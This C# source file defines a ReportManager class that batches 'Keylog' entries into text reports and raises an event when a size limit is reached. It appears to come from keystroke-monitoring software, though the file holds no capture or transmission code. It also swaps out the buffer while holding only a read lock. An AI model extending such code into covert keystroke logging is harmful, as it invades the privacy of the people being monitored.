using MonitorLiteCommon;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Text;

namespace MonitorLiteCore
{
    static class ReportManager
    {
        private static StringBuilder report = new StringBuilder();
        private static Lock reportLock = Lock.Create();

        public static event EventHandler<ReportManagerEventArgs> OnReport;

        public static int MaxReportSize { get; set; }

        public static void AppendToReport(Keylog log)
        {
            reportLock.EnterReadLock();
            if((log == null && report.Length > 0) || (report.Length > MaxReportSize * 1024))
            {
                ExportReport(report.ToString());
                report = new StringBuilder();
            }
            reportLock.ExitReadLock();

            if (log != null)
            {
                reportLock.EnterWriteLock();
                report.AppendLine(log.Export());
                reportLock.ExitWriteLock();
            }
        }
                
        private static void ExportReport(string report)
        {
            Report r = Report.CreateTextReport("Logs", report);

            

            OnReport?.Invoke(null, new ReportManagerEventArgs(r));
        }
    }
}
